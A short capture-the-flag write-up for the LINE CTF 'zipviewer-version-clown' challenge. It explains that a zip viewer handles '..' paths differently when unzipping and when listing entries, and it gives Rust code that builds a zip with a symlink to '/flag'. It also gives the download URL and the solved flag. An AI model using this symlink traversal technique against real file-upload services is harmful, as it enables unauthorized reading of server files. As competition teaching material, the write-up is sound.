# zipviewer-version-clown

If the path of the file contains `..`, it is handled differently during the unzipping and the entry listing.
We can exploit this discrepancy to prevent a symbolic link file from being deleted.

Here is a Rust code that generates such a zip file:

```rust
use std::io::Cursor;

use zip::write::FileOptions;

fn main() -> anyhow::Result<()> {
    let mut buffer = Vec::new();
    {
        let mut zip = zip::ZipWriter::new(Cursor::new(&mut buffer));

        zip.start_file("flag", FileOptions::default())?;

        zip.start_file("middle/flag", FileOptions::default())?;
        zip.add_symlink("middle/../a", "/flag", FileOptions::default())?;

        zip.finish()?;
    }

    std::fs::write("prepare.zip", &buffer)?;

    Ok(())
}
```

After uploading this zip file, the flag can be downloaded at `http://35.243.120.91:11001/download/a`.

Flag: `LINECTF{34d98811f9f20094d1cc75af9299e636}`
